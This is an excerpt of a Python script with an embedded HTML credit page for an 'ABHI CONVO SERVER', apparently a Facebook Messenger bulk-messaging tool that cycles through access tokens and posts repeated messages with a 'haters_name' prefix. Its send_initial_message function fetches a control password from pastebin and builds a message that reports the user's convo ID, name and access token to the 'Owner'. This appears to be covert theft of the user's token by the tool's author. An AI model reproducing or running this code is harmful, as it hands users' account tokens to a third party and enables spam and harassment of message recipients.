...
<body>
    <div class="container">
        <div class="box">
            <h1>ABHI CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:SWEETCOUPLE</p>
                <p>2. OWNER => ABHISIYA</p>
                <p>3. CONTACT:- <a href="https://wa.me/+918949323859">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/th.ston.oii.x.o.o.o.o?mibextid=ZbWKwL">Facebook</a></p>
                <p>5. WATTSAPP GROUP:- <a href="----------💸NiKal">WhatsApp Group</a></p>
            </div>
        </div>
    </div>
    <div class="thanks">
        ...
        <a href="https://www.youtube.com/@lgc_strm">YouTube Channel</a>
    </div>
</body>
</html>
"""
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/ax8x1i6s').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By ABHI ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => ABHI \n Hello abhi's wife's siya queen. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print("\033[1;36m[✓] okie done sweet couple Massage No. {} of Convo {} Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『ABHI ♡ XD 』•═══════✭✪')
                else:
